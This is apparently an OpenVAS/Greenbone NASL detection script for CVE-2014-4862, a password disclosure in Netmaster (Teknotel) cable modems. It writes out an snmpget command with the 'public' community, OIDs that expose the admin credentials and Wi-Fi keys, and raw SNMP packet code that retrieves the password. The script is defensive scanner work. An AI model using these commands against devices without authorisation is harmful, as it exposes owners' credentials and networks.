# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105073");
  script_cve_id("CVE-2014-4862");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("2023-08-10T05:05:53+0000");

  script_name("Netmaster Wireless Cable Modem Password Disclosure");

  script_tag(name:"last_modification", value:"2023-08-10 05:05:53 +0000 (Thu, 10 Aug 2023)");
  script_tag(name:"creation_date", value:"2014-08-25 12:47:34 +0100 (Mon, 25 Aug 2014)");
  script_category(ACT_ATTACK);
  script_family("SNMP");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("gb_snmp_info_collect.nasl");
  script_require_udp_ports("Services/udp/snmp", 161);
  script_mandatory_keys("SNMP/sysdescr/available");

  script_tag(name:"impact", value:"Attackers can exploit this issue to bypass the authentication
  mechanism and gain access to the vulnerable device.");

  script_tag(name:"vuldetect", value:"Try to retrieve the password via SNMP.");

  script_tag(name:"insight", value:"By default this device is exposing critical information by
  requesting '1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0' via SNMP using 'public' as community string.

  This could be tested by running:

  snmpget -v1 -c public <target> 1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0

  The following data is also exposed:

  Username:    1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0

  ssid:        1.3.6.1.4.1.4413.2.2.2.1.5.4.1.14.1.3.32

  WPA PSK:     1.3.6.1.4.1.4413.2.2.2.1.5.4.2.4.1.2.32

  Wep 64-bit:  1.3.6.1.4.1.4413.2.2.2.1.5.4.2.2.1.2.32.1-4

  WEP 128-bit: 1.3.6.1.4.1.4413.2.2.2.1.5.4.2.3.1.2.32.1-4");

  script_tag(name:"solution", value:"Ask the Vendor for an update, disable SNMP or change the default SNMP community.");

  script_tag(name:"summary", value:"The remote Netmaster Wireless Cable Modem is prone to a security-bypass
  vulnerability.");

  script_tag(name:"affected", value:"Netmaster Wireless Cable Modem.");

  script_tag(name:"solution_type", value:"Workaround");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("dump.inc");
include("snmp_func.inc");

function parse_result(data) {

  if( strlen( data ) < 8 ) return FALSE;

  for( v=0; v < strlen( data ); v++ )
  {
    if( ord( data[v] ) == 43 && ord( data[ v-1 ] ) == 15 )
    {
      ok = TRUE;
      break;
    }
    oid_len = ord( data[v] );
  }

  if( !ok || oid_len < 8 )return FALSE;

  tmp = substr( data,( v + oid_len + 2 ) );

  if( !isprint( c:tmp[0] ) )
  {
    tmp = substr( tmp, 1 , strlen( tmp ) - 1 );
  }

  return tmp;

}

port    = snmp_get_port(default:161);
sysdesc = snmp_get_sysdescr(port:port);
if(!sysdesc) exit(0);
if( "VENDOR: TEKNOTEL" >!< sysdesc ) exit( 0 );

community = "public";

soc = open_sock_udp( port );
if( ! soc ) exit( 0 );

for( i=0; i<3; i++ )
{
  sendata = raw_string( 0x30,0x30,0x02,0x01,0x00,0x04,0x06 ) +
                       'public' +
            raw_string( 0xa0,0x23,0x02,0x04,0x10,0x41,0xfe,0xd8,
                        0x02,0x01,0x00,0x02,0x01,0x00,0x30,0x15,
                        0x30,0x13,0x06,0x0f,0x2b,0x06,0x01,0x04,
                        0x01,0xa3,0x0b,0x02,0x04,0x01,0x01,0x06,
                        0x01,0x02,0x00,0x05,0x00 );

  send( socket:soc, data:sendata );
  result = recv( socket:soc, length:400, timeout:1 );

  if( ! result || ord( result[0] ) != 48 ) continue;

  if( res = parse_result( data:result ) )
  {
    close( soc );
    security_message( port:port, proto:'udp', data:'By requesting "1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0" is was possible to retrieve the password "' + res + '".\n' );
    exit( 0 );
  }
}

if( soc ) close( soc );
exit( 99 );
